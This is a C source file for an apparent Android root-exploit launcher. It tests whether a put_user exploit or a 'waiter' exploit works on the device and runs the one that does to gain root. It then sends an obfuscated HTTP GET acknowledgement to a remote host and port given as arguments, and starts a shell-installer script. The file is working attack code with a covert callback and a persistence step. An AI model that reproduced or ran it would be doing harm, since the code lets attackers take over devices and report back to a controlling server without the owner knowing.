#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include "lib_put_user.h"
#include "waiter_exploit.h"
#include "shell_installer.h"
#include "log.h"
#include "deobfuscate.h"

static unsigned char http_req[] = "\x6c\xfd\x80\xd5\xdb\xc8\xb4\xbb\xe1\xb4\xdc\xc8\xc8\xc4\xbd\xa7\xc2\xa4\xbb\xe1"; // "GET %s HTTP/1.0%s"

static void send_ack(char *ip, int port, char *path) {
  struct sockaddr_in server_addr;
  struct hostent *hp;
  int sockfd;
  char report[1024];
  char request[128];

  hp = gethostbyname(ip);
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  server_addr.sin_addr.s_addr = ((struct in_addr*)(hp->h_addr)) -> s_addr;

  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    return;
  }

  if(connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr))) {
    return;
  }
  
  // Create the final get request
  memset(report, sizeof(report), 0);
  snprintf(report, sizeof(report), deobfuscate(http_req), path, "\r\n\r\n");

  // Send report to the server
  send(sockfd, report, strlen(report), 0);
  close(sockfd);
}



int main(int argc, char **argv) {
  int ret = 0;

  if(put_user_check_exploitability()) {
    LOGD("[CHECK] Put_user exploit available\n");
    if(fork())
      pthread_exit(1);
    else
      ret = put_user_get_root(argv[1], argv[0]);
  }
  else if(waiter_exploit_check_exploitability()) {
    LOGD("[CHECK] Waiter exploit available\n");
    if(fork())
      pthread_exit(1);
    else
      ret = waiter_exploit_get_root(argv[1], argv[0]);
  }
  else {
    LOGD("[CHECK] Device doesn't appear to be vulnerable.... giving up!!\n");
    ret = 0;
  }

  sleep(3);

  // Avoid sighup after fork
  setsid();
  
  if(ret) {
    LOGD("[CHECK] Exploit completed...PID %d\n", getpid());
    if(argv[2] && argv[3] && argv[4])  
      send_ack(argv[2], atoi(argv[3]), argv[4]);

    start_script();
  }
}
